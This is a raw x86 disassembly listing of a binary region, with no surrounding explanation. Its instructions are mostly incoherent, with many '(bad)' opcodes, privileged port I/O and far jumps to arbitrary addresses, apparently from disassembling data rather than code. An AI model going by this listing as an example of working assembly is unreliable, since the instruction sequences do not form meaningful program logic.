  4049b9:	push   cs
  4049ba:	sub    DWORD PTR [ebx+esi*1],ebp
  4049bd:	out    dx,eax
  4049be:	xor    DWORD PTR [esi+0x1ea16e7d],ebp
  4049c4:	push   0x7c
  4049c6:	loopne 0x40499d
  4049c8:	push   cs
  4049c9:	push   ebp
  4049ca:	pop    ecx
  4049cb:	add    eax,0xa5eab12
  4049d0:	stc    
  4049d1:	mov    ds:0x582d4f2e,al
  4049d6:	ja     0x404a2f
  4049d8:	jle    0x404995
  4049da:	mov    dl,0x53
  4049dc:	mov    eax,ds:0x591822c6
  4049e1:	dec    ebp
  4049e2:	xchg   ecx,eax
  4049e3:	jb     0x4049ba
  4049e5:	and    DWORD PTR [ecx],0xffffffe8
  4049e8:	jb     0x404a1c
  4049ea:	sbb    al,0xfb
  4049ec:	fsubr  st(7),st
  4049ee:	hlt    
  4049ef:	and    al,0xc7
  4049f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049f2:	fidiv  DWORD PTR [ecx-0x17356caa]
  4049f8:	cmp    DWORD PTR [edi+edi*4],edi
  4049fb:	addr16 xchg ecx,eax
  4049fd:	xchg   BYTE PTR ds:0x2c2fa1c6,dh
  404a03:	out    dx,eax
  404a04:	mov    ecx,0x29dc47a
  404a09:	pop    es
  404a0a:	test   DWORD PTR [eax+0x2b],esp
  404a0d:	sbb    BYTE PTR fs:[ebp+0x4a],dl
  404a11:	(bad)  
  404a12:	popa   
  404a13:	mov    edi,0x989ba0ea
  404a18:	retf   
  404a19:	dec    eax
  404a1a:	enter  0x3308,0x52
  404a1e:	jle    0x404a37
  404a20:	out    0x92,al
  404a22:	xor    al,0x41
  404a24:	sahf   
  404a25:	inc    esp
  404a26:	mov    eax,0xbf433e55
  404a2b:	sbb    BYTE PTR [ecx],dh
  404a2d:	loop   0x404aa6
  404a2f:	mov    ss,eax
  404a31:	fwait
  404a32:	mov    bl,0xe5
  404a34:	xlat   BYTE PTR ds:[ebx]
  404a35:	shr    ch,1
  404a37:	adc    eax,0xc0712d81
  404a3c:	int    0xb9
  404a3e:	adc    dl,BYTE PTR ds:0x26052369
  404a44:	dec    ebp
  404a45:	bound  esi,QWORD PTR [eax]
  404a47:	cmp    eax,0x79db686f
  404a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a4d:	xor    eax,0xb89abe4d
  404a52:	add    BYTE PTR [esi+0x61],ch
  404a55:	imul   edi,DWORD PTR [edi+0x6537a77e],0xffffff93
  404a5c:	push   ebp
  404a5d:	or     al,0x77
  404a5f:	jle    0x4049fb
  404a61:	pop    ss
  404a62:	adc    ebp,DWORD PTR [esi-0x77aae21a]
  404a68:	push   ebp
  404a69:	sbb    BYTE PTR [esi+0x76],0x8f
  404a6d:	fwait
  404a6e:	test   BYTE PTR [ecx-0x2bd68660],al
  404a74:	addr16 mov dh,0x4e
  404a77:	in     al,dx
  404a78:	leave  
  404a79:	adc    al,0x42
  404a7b:	jmp    FWORD PTR [edx]
  404a7d:	add    BYTE PTR [edi],0x5d
  404a80:	dec    esi
  404a81:	lea    ecx,[edi]
  404a83:	loope  0x404a23
  404a85:	pop    ebx
  404a86:	jp     0x404af4
  404a88:	lds    esp,FWORD PTR [ecx+0x6f]
  404a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a8c:	hlt    
  404a8d:	(bad)  
  404a8e:	jl     0x404a1d
  404a90:	push   es
  404a91:	push   es
  404a92:	and    DWORD PTR [eax-0x15c386ed],0xffffffe6
  404a99:	nop
  404a9a:	out    dx,eax
  404a9b:	jo     0x404af2
  404a9d:	push   ebp
  404a9e:	js     0x404a75
  404aa0:	into   
  404aa1:	pop    ds
  404aa2:	inc    esi
  404aa3:	or     edx,DWORD PTR [ebp-0x3015e27b]
  404aa9:	push   es
  404aaa:	mov    dl,0xe0
  404aac:	mov    ebp,0xd12cdec6
  404ab1:	pop    es
  404ab2:	jns    0x404ada
  404ab4:	mov    bh,0x28
  404ab6:	popf   
  404ab7:	cmp    edi,DWORD PTR ds:0x3a35856e
  404abd:	or     ebp,ecx
  404abf:	jno    0x404af3
  404ac1:	gs dec eax
  404ac3:	push   0xe4fa7c6b
  404ac8:	inc    ebp
  404ac9:	inc    bl
  404acb:	push   0x77
  404acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ace:	out    dx,al
  404acf:	push   0x3342c53b
  404ad4:	ins    DWORD PTR es:[edi],dx
  404ad5:	xor    BYTE PTR [esi+0x60],bh
  404ad8:	jo     0x404a5f
  404ada:	add    dl,bl
  404adc:	out    dx,eax
  404add:	sbb    al,BYTE PTR [edx]
  404adf:	pop    ds
  404ae0:	test   BYTE PTR [esi+0xf8b4170],ah
  404ae6:	in     al,0x3b
  404ae8:	sub    eax,0x450c00d1
  404aed:	add    ah,BYTE PTR [edi+0x55]
  404af0:	mov    ah,cl
  404af2:	in     al,dx
  404af3:	push   edx
  404af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404af5:	test   al,0xab
  404af7:	(bad)  
  404af8:	bound  ebp,QWORD PTR [ecx-0x6da1559f]
  404afe:	inc    esi
  404aff:	xchg   ebx,eax
  404b00:	xchg   edx,eax
  404b01:	xchg   edx,eax
  404b02:	imul   ebp,esp,0xd5ec829a
  404b08:	int3   
  404b09:	aas    
  404b0a:	or     BYTE PTR gs:[edx-0x7094d0fa],bl
  404b11:	inc    edx
  404b12:	xlat   BYTE PTR ds:[ebx]
  404b13:	pop    eax
  404b14:	and    eax,0xc3fc35c8
  404b19:	mov    ebp,0x58743760
  404b1e:	(bad)  
  404b1f:	je     0x404ab1
  404b21:	mov    ch,0x4e
  404b23:	sub    al,0x63
  404b25:	adc    eax,0x8a3a310e
  404b2a:	dec    eax
  404b2b:	shr    edi,1
  404b2d:	push   esi
  404b2e:	adc    al,0x3
  404b30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b31:	and    edi,DWORD PTR [edx]
  404b33:	mov    ah,0x9a
  404b35:	gs cwde 
  404b37:	leave  
  404b38:	push   esp
  404b39:	fcom   st(3)
  404b3b:	add    al,BYTE PTR [ebx+0x3a305b71]
  404b41:	daa    
  404b42:	repnz push cs
  404b44:	outs   dx,BYTE PTR ds:[esi]
  404b45:	std    
  404b46:	cmp    DWORD PTR [edi+0x13d1854d],0x3a
  404b4d:	sub    BYTE PTR [edi+0x64],0xe3
  404b51:	(bad)  
  404b52:	das    
  404b53:	aaa    
  404b54:	and    edx,DWORD PTR [edx-0x2a]
  404b57:	(bad)  
  404b58:	cmp    esi,DWORD PTR [ebp-0x14]
  404b5b:	pop    esi
  404b5c:	pop    ebx
  404b5d:	cmp    eax,0xe536815e
  404b62:	dec    ebp
  404b63:	or     ebx,eax
  404b65:	and    BYTE PTR [ebx+0x10],bh
  404b68:	stos   BYTE PTR es:[edi],al
  404b69:	ins    BYTE PTR es:[edi],dx
  404b6a:	iret   
  404b6b:	mov    al,0x2b
  404b6d:	add    DWORD PTR [esi],esp
  404b6f:	(bad)  
  404b70:	dec    edx
  404b71:	out    dx,al
  404b72:	int3   
  404b73:	ja     0x404bb2
  404b75:	int3   
  404b76:	sbb    dl,BYTE PTR [ebx]
  404b78:	imul   DWORD PTR [ecx+0x64]
  404b7b:	bound  esp,QWORD PTR [esi+0x79]
  404b7e:	xor    edi,DWORD PTR [edx+eiz*2+0x64e13185]
  404b85:	(bad)  
  404b86:	(bad)  
  404b87:	push   edi
  404b88:	aam    0xee
  404b8a:	pop    es
  404b8b:	sub    al,0xd
  404b8d:	add    DWORD PTR [edx+0x68],edi
  404b90:	arpl   bp,bp
  404b92:	cwde   
  404b93:	imul   esi,ebp,0x5d49abf2
  404b99:	xor    bl,bl
  404b9b:	leave  
  404b9c:	mov    DWORD PTR [ecx-0x56efa6f9],esp
  404ba2:	xor    BYTE PTR [edi+ebp*4+0x16],al
  404ba6:	push   es
  404ba7:	jp     0x404b93
  404ba9:	stos   BYTE PTR es:[edi],al
  404baa:	adc    DWORD PTR [edx-0x73984cbb],edi
  404bb0:	fwait
  404bb1:	ret    
  404bb2:	xchg   edx,eax
  404bb3:	mov    bh,0xa
  404bb5:	adc    DWORD PTR [ecx-0x6018ce2d],esi
  404bbb:	fld    QWORD PTR [ebx-0x676a6cff]
  404bc1:	popf   
  404bc2:	push   esi
  404bc3:	nop
  404bc4:	bound  esi,QWORD PTR [edx-0x5f]
  404bc7:	or     bl,BYTE PTR [ecx-0x1b]
  404bca:	shl    dl,0xc9
  404bcd:	rcl    BYTE PTR ds:0x6da77a6e,1
  404bd3:	push   esi
  404bd4:	ret    
  404bd5:	shr    DWORD PTR [esi+0x4864b155],cl
  404bdb:	sub    esi,esi
  404bdd:	lods   eax,DWORD PTR ds:[esi]
  404bde:	jae    0x404c31
  404be0:	or     esp,DWORD PTR [edi]
  404be2:	int    0x24
  404be4:	adc    al,0x4f
  404be6:	lahf   
  404be7:	pop    eax
  404be8:	push   ebx
  404be9:	ret    
  404bea:	(bad)  
  404bec:	cmp    al,BYTE PTR ds:0x33537c7b
  404bf2:	aad    0xbd
  404bf4:	ficomp WORD PTR [ebp-0x8]
  404bf7:	das    
  404bf8:	mul    ch
  404bfa:	mov    ah,0xb
  404bfc:	out    0xc4,al
  404bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bff:	icebp  
  404c00:	ins    BYTE PTR es:[edi],dx
  404c01:	mov    dl,0xc4
  404c03:	outs   dx,BYTE PTR ds:[esi]
  404c04:	test   DWORD PTR [ecx-0x1c],esi
  404c07:	mov    ah,0x17
  404c09:	out    0xde,eax
  404c0b:	add    cl,BYTE PTR [edi-0x31]
  404c0e:	push   esi
  404c0f:	mov    ebp,0xe7b9d2c8
  404c14:	jbe    0x404c67
  404c16:	inc    edx
  404c17:	and    al,0x74
  404c19:	mov    ds,WORD PTR [ebx]
  404c1b:	dec    ebp
  404c1c:	ins    BYTE PTR es:[edi],dx
  404c1d:	jmp    0x87318339
  404c22:	mov    al,0x22
  404c24:	scas   al,BYTE PTR es:[edi]
  404c25:	push   ecx
  404c26:	and    DWORD PTR [eax+0x51d1d447],edx
  404c2c:	mov    BYTE PTR [ecx+edi*1-0x3c],ah
  404c30:	xchg   esi,eax
  404c31:	pushf  
  404c32:	add    BYTE PTR [edi-0x6b],0x6
  404c36:	dec    ebx
  404c37:	dec    ecx
  404c38:	xor    BYTE PTR [eax],cl
  404c3a:	(bad)  
  404c3b:	out    dx,al
  404c3c:	(bad)  
  404c3d:	sar    DWORD PTR [ebx-0xe],1
  404c40:	sub    al,0xb7
  404c42:	push   ebp
  404c43:	or     BYTE PTR [ebx],al
  404c45:	aaa    
  404c46:	or     al,0x25
  404c48:	test   BYTE PTR [ebx],bh
  404c4a:	pop    ebx
  404c4b:	pop    esp
  404c4c:	je     0x404cc0
  404c4e:	jmp    0x9297:0x3c97677a
  404c55:	les    eax,FWORD PTR [edi+0x174d6691]
  404c5b:	adc    al,0x89
  404c5d:	push   esp
  404c5e:	push   eax
  404c5f:	adc    eax,DWORD PTR [edi]
  404c61:	push   ebp
  404c62:	data16 jb 0x404cc1
  404c65:	lea    ecx,[esp+ebp*1-0x4271a8d0]
  404c6c:	adc    DWORD PTR [ecx-0x5a595723],ebx
  404c72:	scas   eax,DWORD PTR es:[edi]
  404c73:	jns    0x404c80
  404c75:	ins    BYTE PTR es:[edi],dx
  404c76:	dec    eax
  404c77:	loope  0x404c29
  404c79:	jmp    0x999b:0x7f7eb728
  404c80:	daa    
  404c81:	sub    eax,0xaaa9b469
  404c86:	jp     0x404cb3
  404c88:	sahf   
  404c89:	scas   al,BYTE PTR es:[edi]
  404c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c8b:	packuswb mm5,mm0
  404c8e:	lock js 0x404ccf
  404c91:	xchg   edx,eax
  404c92:	in     al,dx
  404c93:	in     eax,0xe1
  404c95:	jae    0x404ceb
  404c97:	add    BYTE PTR [ebx+0x5eca8322],bl
  404c9d:	push   ebx
  404c9e:	adc    ebp,DWORD PTR [ecx]
  404ca0:	cmp    DWORD PTR [bx-0xb],ebp
  404ca4:	xor    DWORD PTR [edi-0x5d],esi
  404ca7:	sub    ch,BYTE PTR [ebx+0x20ec049c]
  404cad:	repnz adc edx,ebp
  404cb0:	ret    
  404cb1:	inc    eax
  404cb2:	call   0xa50f:0x93dd88a6
  404cb9:	leave  
  404cba:	test   al,0xe1
  404cbc:	push   es
  404cbd:	stc    
  404cbe:	arpl   WORD PTR [eax-0xc88ea2b],ax
  404cc4:	outs   dx,DWORD PTR ds:[esi]
  404cc5:	hlt    
  404cc6:	stc    
  404cc7:	xchg   ecx,eax
  404cc8:	pop    esi
  404cc9:	rcl    DWORD PTR [esi-0x6e],cl
  404ccc:	jl     0x404ca9
  404cce:	and    ch,BYTE PTR [ebx]
  404cd0:	js     0x404c8a
  404cd2:	pop    ecx
  404cd3:	push   ebx
  404cd4:	cmovs  edi,DWORD PTR [edi]
  404cd7:	cdq    
  404cd8:	jnp    0x404ce5
  404cda:	dec    eax
  404cdb:	retf   
  404cdc:	mov    eax,0x1b0a0ef7
  404ce1:	neg    edi
  404ce3:	or     al,0x27
  404ce5:	add    al,0x6
  404ce7:	lods   eax,DWORD PTR ds:[esi]
  404ce9:	adc    WORD PTR [ecx+0x22],ax
  404ced:	test   DWORD PTR [esi],ebx
  404cef:	jge    0x404cce
  404cf1:	pushf  
  404cf2:	imul   DWORD PTR [ecx]
  404cf4:	mov    ebp,0xf07b222c
  404cf9:	mov    WORD PTR [edi],ds
  404cfb:	push   0xd5ef37e7
  404d00:	(bad)  
  404d01:	hlt    
  404d02:	pop    ecx
  404d03:	add    eax,esp
  404d05:	cmp    BYTE PTR ds:0x9c52a06a,al
  404d0b:	sub    al,0x71
  404d0d:	sub    dh,BYTE PTR [esp+eax*1+0x37888207]
  404d14:	jnp    0x404cbc
  404d16:	repnz xchg ebp,eax
  404d18:	pop    ebp
  404d19:	imul   esp,DWORD PTR [esi+edx*1+0x1c],0xc959b017
  404d21:	mov    edx,0xa731a909
  404d26:	test   eax,0x24d5e6a4
  404d2b:	in     al,0x59
  404d2d:	add    dh,BYTE PTR [esi+0x57cabf56]
  404d33:	and    eax,0xf890416f
  404d38:	iret   
  404d39:	mov    al,ds:0x1d0e3a87
  404d3e:	test   eax,0x869c0b46
  404d43:	in     al,dx
  404d44:	(bad)  
  404d46:	(bad)  
  404d47:	xchg   BYTE PTR [ebp+edi*4+0x1f481a0a],dl
  404d4e:	inc    ecx
  404d4f:	pop    ebp
  404d50:	stos   BYTE PTR es:[edi],al
  404d51:	inc    ecx
  404d52:	mov    al,0x59
  404d54:	out    0x33,al
  404d56:	sub    eax,0xeac8cf2a
  404d5b:	mov    edi,0x4a9f29e1
  404d60:	scas   al,BYTE PTR es:[edi]
  404d61:	std    
  404d62:	push   ds
  404d63:	jbe    0x404d79
  404d65:	push   edx
  404d66:	xlat   BYTE PTR ds:[ebx]
  404d67:	nop
  404d68:	aas    
  404d69:	adc    eax,0x22262b97
  404d6e:	lock push ebp
  404d70:	arpl   WORD PTR [edx],cx
  404d72:	fistp  QWORD PTR [eax+0x59]
  404d75:	push   cs
  404d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d77:	push   ebp
  404d78:	jp     0x404d12
  404d7a:	ret    
  404d7b:	out    0xe2,eax
  404d7d:	fwait
  404d7e:	(bad)  
  404d7f:	xchg   ebp,eax
  404d80:	sti    
  404d81:	out    0x7c,al
  404d83:	cmp    bh,ch
  404d85:	jno    0x404deb
  404d87:	add    edi,ebp
  404d89:	(bad)  
  404d8a:	fcmovb st,st(7)
  404d8c:	test   bl,bh
  404d8e:	inc    esi
  404d8f:	cld    
  404d90:	lea    ebp,[eax]
  404d92:	pop    ss
  404d93:	fild   QWORD PTR [ebx+0x1a]
  404d96:	mov    bl,0x3f
  404d98:	scas   al,BYTE PTR es:[edi]
  404d99:	mov    eax,ds:0x1e52b4ea
  404d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d9f:	or     al,0xff
  404da1:	out    dx,al
  404da2:	lods   eax,DWORD PTR ds:[esi]
  404da3:	mov    esp,0x73ac4b3e
  404da8:	loopne 0x404df3
  404daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dab:	aam    0xc9
  404dad:	sar    DWORD PTR [edx-0x412244a2],0x81
  404db4:	les    edx,FWORD PTR [edx+0x7ab8c68b]
  404dba:	out    0x73,al
  404dbc:	inc    edx
  404dbd:	sete   BYTE PTR [ebx]
  404dc0:	jmp    0xa765e0b5
  404dc5:	push   ebp
  404dc6:	(bad)  
  404dc8:	imul   edi,DWORD PTR [edi+esi*4+0x1adf2daa],0x965ad046
  404dd3:	inc    eax
  404dd4:	ss xchg ecx,eax
  404dd6:	or     eax,ebp
  404dd8:	js     0x404d8a
  404dda:	sbb    eax,0x83bbe430
  404ddf:	jmp    0xf5d:0x194e0011
  404de6:	ds jl  0x404e33
  404de9:	outs   dx,DWORD PTR ds:[esi]
  404dea:	lea    esi,[ebx-0x673ba29a]
  404df0:	inc    edx
  404df1:	add    BYTE PTR [edi+0x411bed28],ch
  404df7:	mov    ecx,0xa885c2e2
  404dfc:	fs (bad) 
  404dfe:	jb     0x404e1c
  404e00:	mov    BYTE PTR [esi+0x60],dl
  404e03:	iret   
  404e04:	mov    bh,0xdb
  404e06:	das    
  404e07:	out    dx,eax
  404e08:	and    edx,ebp
  404e0a:	mov    ch,0x20
  404e0c:	cmp    eax,0x1d128a8a
  404e11:	mov    bh,0x1e
  404e13:	xlat   BYTE PTR ds:[ebx]
  404e14:	mov    al,0xa7
  404e16:	lock inc eax
  404e18:	and    DWORD PTR [ecx+0x2a6b7cda],esi
  404e1e:	or     ebx,DWORD PTR [edi+edx*2+0x42]
  404e22:	inc    esp
  404e23:	mov    ch,0x50
  404e25:	push   0x8285521e
  404e2a:	ja     0x404dc7
  404e2c:	jp     0x404dbc
  404e2e:	and    eax,0x7eca132
  404e33:	xchg   ebx,eax
  404e34:	(bad)  
  404e36:	fidivr WORD PTR [esi+edx*8]
  404e39:	data16 mov ch,0x64
  404e3c:	lahf   
  404e3d:	dec    edx
  404e3e:	mov    al,0x85
  404e40:	fst    QWORD PTR [ebx-0x10effb18]
  404e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e47:	jecxz  0x404e13
  404e49:	push   esi
  404e4a:	imul   ebp,ebx,0x2d
  404e4d:	jns    0x404ddc
  404e4f:	fistp  DWORD PTR [eax-0x7cd6fb5b]
  404e55:	add    ebx,esi
  404e57:	adc    al,0xda
  404e59:	test   bl,0x16
  404e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e5d:	xchg   edi,eax
  404e5e:	pop    edi
  404e5f:	scas   eax,DWORD PTR es:[edi]
  404e60:	inc    edx
  404e61:	fisub  WORD PTR [esi-0x8]
  404e64:	jg     0x404eb8
  404e66:	arpl   sp,bx
  404e68:	xor    DWORD PTR [esi-0x4e6271f5],ebp
  404e6e:	sbb    al,0x47
  404e70:	dec    edx
  404e71:	jg     0x404e79
  404e73:	add    BYTE PTR [esi+eax*2+0x5f],bl
  404e77:	outs   dx,DWORD PTR ds:[esi]
  404e78:	sbb    al,0x7
  404e7a:	sub    DWORD PTR [eax*1+0x5d5f6220],ebx
  404e81:	in     eax,dx
  404e82:	call   0xb4fd888a
  404e87:	mov    BYTE PTR [esi+0x56],bl
  404e8a:	imul   ecx,ebx,0xf56cb3f7
  404e90:	mov    edx,0x5d85a42
  404e95:	jge    0x404e33
  404e97:	sub    ebp,DWORD PTR [eax]
  404e99:	push   ecx
  404e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9b:	adc    BYTE PTR [ebx],bh
  404e9d:	cmp    al,0x7b
  404e9f:	cmp    edi,DWORD PTR [edx-0x49e76eaf]
  404ea5:	and    al,0x65
  404ea7:	mov    eax,0x13391f95
  404eac:	push   ebx
  404ead:	retf   0x8af5
  404eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eb1:	test   BYTE PTR gs:0x217d5f47,ah
  404eb8:	in     al,0x9a
  404eba:	popf   
  404ebb:	bound  ebp,QWORD PTR [ebp-0x615653ab]
  404ec1:	adc    BYTE PTR [ebp+0x5d58842b],dl
  404ec7:	sti    
  404ec8:	inc    esp
  404ec9:	out    0x5d,eax
  404ecb:	sahf   
  404ecc:	in     al,0xe7
  404ece:	inc    esp
  404ecf:	mov    BYTE PTR [ecx],dl
  404ed1:	cs jle 0x404f47
  404ed4:	jmp    0x404e8e
  404ed6:	rcr    eax,cl
  404ed8:	mov    al,ds:0x34d0b842
  404edd:	xor    eax,DWORD PTR [ebx-0x53]
  404ee0:	xor    esi,edx
  404ee2:	or     al,0xcb
  404ee4:	aam    0x39
  404ee6:	fs retf 
  404ee8:	pop    ds
  404ee9:	jmp    0x1a533fa5
  404eee:	pop    ebx
  404eef:	mov    bh,0x6e
  404ef1:	adc    eax,0xd8663732
  404ef6:	mov    ebx,0x4b4499f2
  404efb:	sub    BYTE PTR [esi-0x5f],ah
  404efe:	retf   
  404eff:	adc    BYTE PTR [edx*4+0x33e58f46],cl
  404f06:	repz (bad) 
  404f08:	enter  0xdbe5,0x30
  404f0c:	mov    WORD PTR ds:0xfb56e53c,?
  404f12:	sbb    DWORD PTR [ebx],eax
  404f14:	mov    gs,WORD PTR [ebp+0x4f46bcc0]
  404f1a:	pop    esp
  404f1b:	mov    WORD PTR [esi+edx*2+0x5908875b],?
  404f22:	mov    ecx,0xd7855781
  404f27:	outs   dx,BYTE PTR ds:[esi]
  404f28:	rcl    DWORD PTR [ebx+0x467a03e3],cl
  404f2e:	stc    
  404f2f:	out    dx,eax
  404f30:	cmp    esp,DWORD PTR [ecx-0x2e3f8e00]
  404f36:	into   
  404f37:	leave  
  404f38:	pusha  
  404f39:	and    al,BYTE PTR [ebp-0x5d08de2d]
  404f3f:	fs aad 0x8b
  404f42:	mov    eax,ds:0xd8eb96b7
  404f47:	xlat   BYTE PTR ds:[ebx]
  404f48:	mov    cs,WORD PTR ds:0xbb8132c8
  404f4e:	mov    ch,0x9b
  404f50:	cwde   
  404f51:	mov    ds:0x8bf27d36,eax
  404f56:	cmp    esi,DWORD PTR [edi-0x2be27dfb]
  404f5c:	ret    
  404f5d:	jge    0x404fcf
  404f5f:	add    ch,BYTE PTR [esi-0x3c]
  404f62:	rcr    BYTE PTR [ebp+0x18],1
  404f65:	mov    bl,0x70
  404f67:	pop    edi
  404f68:	mov    esi,edi
  404f6a:	cli    
  404f6b:	pop    ss
  404f6c:	push   esp
  404f6d:	test   al,ah
  404f6f:	popa   
  404f70:	pop    ecx
  404f71:	rol    DWORD PTR [ebx-0x34fe6db1],0xda
  404f78:	jecxz  0x404f5e
  404f7a:	fdiv   QWORD PTR [ebx+0x63713dc3]
  404f80:	xchg   DWORD PTR [esi+0x46],esp
  404f83:	xor    ch,BYTE PTR [ebp-0xe]
  404f86:	jle    0x404f80
  404f88:	mov    ebp,0xc86c517b
  404f8d:	pop    ebp
  404f8e:	pop    edx
  404f8f:	pop    ebp
  404f90:	jo     0x404f47
  404f92:	sub    BYTE PTR [edx+0xd9d2294],bh
  404f98:	mov    esi,0x7d5f19a9
  404f9d:	mov    cl,0x3
  404f9f:	push   edi
  404fa0:	mov    ebp,0xa0215ac4
  404fa5:	inc    eax
  404fa6:	outs   dx,DWORD PTR ds:[esi]
  404fa7:	sbb    al,0x96
  404fa9:	or     al,0x6
  404fab:	mov    ebx,0xc25e627e
  404fb0:	mov    edi,0xd789ae40
  404fb5:	add    BYTE PTR [edi],bh
  404fb7:	aaa    
  404fb8:	sbb    al,0x29
  404fba:	fs jp  0x404fad
  404fbd:	nop
  404fbe:	sbb    BYTE PTR [esi],bl
  404fc0:	fstp   TBYTE PTR [ecx-0x735c7de7]
  404fc6:	out    0xe,al
  404fc8:	and    BYTE PTR [eax+edi*2],dl
  404fcb:	lahf   
  404fcc:	fidiv  WORD PTR [esp+eiz*8+0x0]
  404fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fd1:	push   ecx
  404fd2:	mov    eax,ds:0x5f708acd
  404fd7:	ins    BYTE PTR es:[edi],dx
  404fd8:	mul    eax
  404fda:	xchg   edx,eax
  404fdb:	call   0x866:0xe5935b9e
  404fe2:	ds popf 
  404fe4:	daa    
  404fe5:	int    0x25
  404fe7:	push   esp
  404fe8:	sbb    ch,0xdf
  404feb:	jg     0x405015
  404fed:	pop    edx
  404fee:	shl    BYTE PTR [edi],1
  404ff0:	retf   0x361e
  404ff3:	inc    ebx
  404ff4:	push   ebx
  404ff5:	test   al,0x2a
  404ff7:	aaa    
  404ff8:	rcl    ebp,1
  404ffa:	ror    DWORD PTR [ebx],1
  404ffc:	inc    ebx
  404ffd:	or     bl,ah
  404fff:	ficom  WORD PTR [esi]
  405001:	aaa    
  405002:	pop    edi
  405003:	pop    esi
  405004:	daa    
  405005:	adc    BYTE PTR [ebx+0x19c1f83e],dh
  40500b:	fst    DWORD PTR [ebp-0x6b61b6b4]
  405011:	popa   
  405012:	jmp    0x23be:0x6138b978
  405019:	push   ecx
  40501a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40501b:	jmp    0xdd0:0x4083cabf
  405022:	push   ecx
  405023:	xchg   BYTE PTR [ebp+0x43d13003],ch
  405029:	pop    ds
  40502a:	or     BYTE PTR [esi],dl
  40502c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40502d:	fistp  WORD PTR [esi]
  40502f:	xlat   BYTE PTR ds:[ebx]
  405030:	pusha  
  405031:	aas    
  405032:	test   eax,0xba3221f0
  405037:	or     al,0x52
  405039:	jecxz  0x405082
  40503b:	inc    ebp
  40503c:	inc    ebx
  40503d:	mov    edi,0x32538c95
  405042:	ret    0x7146
  405045:	arpl   WORD PTR gs:[ebx+edx*4-0x359e3b16],sp
  40504d:	scas   al,BYTE PTR es:[edi]
  40504e:	mov    eax,0x34437df3
  405053:	add    BYTE PTR [edx],al
  405055:	or     eax,0xd2f8a530
  40505a:	adc    BYTE PTR [eax-0x65],bl
  40505d:	repz jno 0x404fef
  405060:	push   cs
  405061:	and    edi,edx
  405063:	adc    bh,BYTE PTR [edi-0x47b845fe]
  405069:	push   esi
  40506a:	inc    edx
  40506b:	add    eax,0xc4a75568
  405070:	inc    edi
  405071:	int    0x72
  405073:	jg     0x404fff
  405075:	and    al,BYTE PTR [eax-0x31a317f1]
  40507b:	push   ss
  40507c:	fdiv   st(7),st
  40507e:	sar    eax,1
  405080:	mov    ebx,0xa847f8ea
  405085:	mov    ch,0x65
  405087:	xor    al,0x71
  405089:	mov    edx,0xcd6e34c6
  40508e:	or     eax,0x44edb52c
  405093:	aas    
  405094:	jno    0x40507a
  405096:	add    eax,esi
  405098:	cs pop ss
  40509a:	jl     0x40511b
  40509c:	sahf   
  40509d:	sub    BYTE PTR [edx],bh
  40509f:	jl     0x40507f
  4050a1:	push   ds
  4050a2:	lock lods al,BYTE PTR ds:[esi]
  4050a4:	xor    ebx,DWORD PTR [edi-0xc1746ac]
  4050aa:	fldenv [ecx+0x1afc3ae]
  4050b0:	in     eax,0xe0
  4050b2:	xor    BYTE PTR ds:0xe2d64d21,0x4f
  4050b9:	test   al,0x9a
  4050bb:	pop    eax
  4050bc:	dec    eax
  4050bd:	xor    al,0x53
  4050bf:	add    esp,DWORD PTR [esi]
  4050c1:	shr    DWORD PTR [eax+0x2bd7392b],cl
  4050c7:	test   DWORD PTR [eax-0x2a0d0845],edx
  4050cd:	aas    
  4050ce:	cmp    ah,BYTE PTR [esi+0x24]
  4050d1:	stos   DWORD PTR es:[edi],eax
  4050d2:	xchg   ebx,eax
  4050d3:	push   eax
  4050d4:	js     0x40514c
  4050d6:	push   0x63
  4050d8:	xlat   BYTE PTR ds:[ebx]
  4050d9:	cmp    ebx,ebp
  4050db:	inc    ebx
  4050dc:	stos   BYTE PTR es:[edi],al
  4050dd:	mov    cs,edx
  4050df:	out    dx,eax
  4050e0:	mov    esp,0xbaac730c
  4050e5:	pop    ebx
  4050e6:	mov    al,ds:0xf64c0a3f
  4050eb:	arpl   WORD PTR [eax-0x42],sp
  4050ee:	push   edi
  4050ef:	pop    ebx
  4050f0:	stos   DWORD PTR es:[edi],eax
  4050f1:	cmp    al,0xeb
  4050f3:	or     edi,eax
  4050f5:	mov    bl,0x22
  4050f7:	sbb    bl,dh
  4050f9:	in     al,0x95
  4050fb:	fwait
  4050fc:	rcr    DWORD PTR [eax+0x2014daa2],cl
  405102:	in     eax,dx
  405103:	jae    0x405120
  405105:	push   esi
  405106:	mov    DWORD PTR [ecx+0x7ebbf9e8],ecx
  40510c:	out    0x45,al
  40510e:	xchg   edx,eax
  40510f:	mov    ch,0x32
  405111:	jp     0x405140
  405113:	leave  
  405114:	mov    esi,0xcd8b668a
  405119:	xchg   esi,eax
  40511a:	cmp    BYTE PTR ds:0x19f555b6,ah
  405120:	cs pushf 
  405122:	ja     0x4050ea
  405124:	lds    edi,FWORD PTR [esi-0x1dcd79fb]
  40512a:	add    bh,bh
  40512c:	mov    ch,0x74
  40512e:	out    dx,al
  40512f:	jle    0x4050de
  405131:	lods   eax,DWORD PTR ds:[esi]
  405132:	(bad)  
  405133:	push   eax
  405134:	mov    BYTE PTR [ebx+eax*2+0x7a2d1ec7],bh
  40513b:	clc    
  40513c:	pop    ecx
  40513d:	dec    ecx
  40513e:	sub    ebp,eax
  405140:	test   BYTE PTR [eax-0x64],ch
  405143:	push   ecx
  405144:	stos   DWORD PTR es:[edi],eax
